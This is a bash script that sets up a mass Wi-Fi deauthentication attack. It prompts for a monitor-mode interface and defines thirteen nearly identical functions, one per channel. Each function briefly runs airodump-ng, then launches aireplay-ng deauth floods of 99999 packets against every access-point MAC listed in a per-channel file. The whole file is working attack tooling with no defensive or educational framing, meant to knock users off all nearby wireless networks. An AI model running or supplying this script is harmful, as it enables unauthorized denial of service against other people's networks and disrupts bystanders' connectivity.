AirDumper=airodump-ng
AirAttack=aireplay-ng
Tool=xterm

echo ""
echo "put youre interface name in monitor mode in the next input"
                                        read -p "└─────►$(tput setaf 7) " wifiInterfaceMon


attack1(){
echo "Starting Deauth attack by broadcast in all networks from channel 1" &

sudo timeout 10s $Tool -e "$AirDumper" -c 1 $wifiInterfaceMon &

file="APs1.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack2(){
echo "Starting Deauth attack by broadcast in all networks from channel 2" &

sudo timeout 10s $Tool -e "$AirDumper" -c 2 $wifiInterfaceMon &

file="APs2.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack3(){
echo "Starting Deauth attack by broadcast in all networks from channel 3" &

sudo timeout 10s $Tool -e "$AirDumper" -c 3 $wifiInterfaceMon &

file="APs3.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack4(){
echo "Starting Deauth attack by broadcast in all networks from channel 4" &

sudo timeout 10s $Tool -e "$AirDumper" -c 4 $wifiInterfaceMon &

file="APs4.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack5(){
echo "Starting Deauth attack by broadcast in all networks from channel 5" &

sudo timeout 10s $Tool -e "$AirDumper" -c 5 $wifiInterfaceMon &

file="APs5.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack6(){
echo "Starting Deauth attack by broadcast in all networks from channel 6" &

sudo timeout 10s $Tool -e "$AirDumper" -c 6 $wifiInterfaceMon &

file="APs6.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack7(){
echo "Starting Deauth attack by broadcast in all networks from channel 7" &

sudo timeout 10s $Tool -e "$AirDumper" -c 7 $wifiInterfaceMon &

file="APs7.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack8(){
echo "Starting Deauth attack by broadcast in all networks from channel 8" &

sudo timeout 10s $Tool -e "$AirDumper" -c 8 $wifiInterfaceMon &

file="APs8.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack9(){
echo "Starting Deauth attack by broadcast in all networks from channel 9" &

sudo timeout 10s $Tool -e "$AirDumper" -c 9 $wifiInterfaceMon &

file="APs9.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack10(){
echo "Starting Deauth attack by broadcast in all networks from channel 10" &

sudo timeout 10s $Tool -e "$AirDumper" -c 10 $wifiInterfaceMon &

file="APs10.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack11(){
echo "Starting Deauth attack by broadcast in all networks from channel 11" &

sudo timeout 10s $Tool -e "$AirDumper" -c 11 $wifiInterfaceMon &

file="APs11.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack12(){
echo "Starting Deauth attack by broadcast in all networks from channel 12" &

sudo timeout 10s $Tool -e "$AirDumper" -c 12 $wifiInterfaceMon &

file="APs12.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

attack13(){
echo "Starting Deauth attack by broadcast in all networks from channel 13" &

sudo timeout 10s $Tool -e "$AirDumper" -c 13 $wifiInterfaceMon &

file="APs13.txt"

if [ -f "$file" ]; then
        while IFS= read -r target; do
sudo "$Tool" -e "$AirAttack -0 99999 -a $target $wifiInterfaceMon" &

done < "$file"

fi
}

